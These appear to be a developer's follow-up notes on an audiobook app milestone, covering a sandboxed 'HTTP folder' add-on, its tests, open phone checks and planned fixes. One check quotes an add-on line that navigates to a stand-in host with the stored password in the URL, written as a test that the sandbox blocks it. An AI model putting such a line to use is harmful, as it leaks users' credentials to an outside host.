# M57 follow-ups

Checked in the web preview (Chrome): “Add a server” shows HTTP folder next to WebDAV, S3,
Jellyfin and Audiobookshelf, with the form its manifest describes. Against a small test server
with directory listings, a wrong password says “The server answered HTTP 401 for /books/.” and
saves nothing; the right one connects (“3 files found”), and the scan puts its two books in the
Library, listed in Settings → Servers as “HTTP folder · localhost:8096”. The add-on ran in its
worker (the app refuses settings otherwise). A server without a login plays its book in the
browser straight from the server. Removing a server removes its books.

Covered by tests: the protocol (settings fields and what the listener types, the hosts a form
grants, header names and values, a library listing and its paths, web add-ons refused settings, a
library and stream headers, also by `createAddon` with validation off), a stream with headers
from a web add-on dropped and one from an add-on inside the app kept, headers sent only to the
add-on's own hosts and never to another add-on's book, files and covers on other hosts left out
of a scan, passwords and headers sealed in the database and asked for again on another phone, and
none of them in sync, exports, the diagnostics report or a scan failure. The bundled HTTP folder
add-on is run as the sandbox runs it: HTML and nginx JSON listings, links that lead elsewhere left
out, HTTP Basic with a UTF-8 name, a refused folder failing the whole listing. A test fails when
the bundled file and the app's copy differ.

## Open on a phone

- <a id="worker"></a>The sandbox now runs an add-on's code in a worker inside the WebView. Install
  `examples/in-app-addon/home-shelf.js` and check Home still gets its catalog; then add an HTTP
  folder server with a login. If the WebView can't start a worker, adding it says “This add-on
  needs a login, which this device can’t keep apart from it.”: that is the safe failure, but means
  add-on servers don't work on that phone.
- <a id="play"></a>An HTTP folder server with a login (nginx `autoindex on` behind
  `auth_basic`, or Caddy `file_server browse` with `basic_auth`): its books scan into the Library,
  play with the screen off, download on Wi-Fi, and keep playing from the download in flight mode.
- <a id="closed"></a>With the app swiped away, a book from that server plays from the
  notification and from Android Auto (the login travels in the playback service's journal, as
  WebDAV's does).
- <a id="cast"></a>Cast a book from that server to a speaker: the phone serves it with the login,
  the speaker plays it.
- <a id="rescan"></a>Settings → Rescan picks up a book added to the server folder and marks a
  removed one missing; restart the app and the server scans with the others.
- <a id="restore"></a>Restore a backup on another phone: the HTTP folder server shows “Password
  needed”, Log in asks only for the password (address and user kept), and its books come back.
- <a id="navigate"></a>An add-on file that tries `location.href = 'https://example.org/?x=' +
settings.password` inside `library`: nothing opens in the browser, nothing leaves the phone.
  Before this milestone, a navigation from the sandbox page was handed to the phone's browser.

## Later

- Media3 and the cast server follow a redirect with the same headers, to any host. True for
  WebDAV logins today too. Dropping headers when a redirect leaves the host needs a data source
  of our own in `modules/audio` and a manual redirect loop in `modules/cast`
  (`modules/download` already does it).
- Settings reach only `library` calls. An add-on with settings that also offers catalogs or
  streams runs those without them, in its shared sandbox.
- One sandbox per server keeps each one's settings apart; many add-on servers mean as many hidden
  WebViews while they scan. Closing a server's sandbox after its scan would save memory.
- The web build can't send headers with audio, so books from a server with a login play in the
  Android app only, as with WebDAV.
- A library listing is one answer of at most 5 MB (about 20,000 files). Paging, if a source needs
  it, would be a later revision.
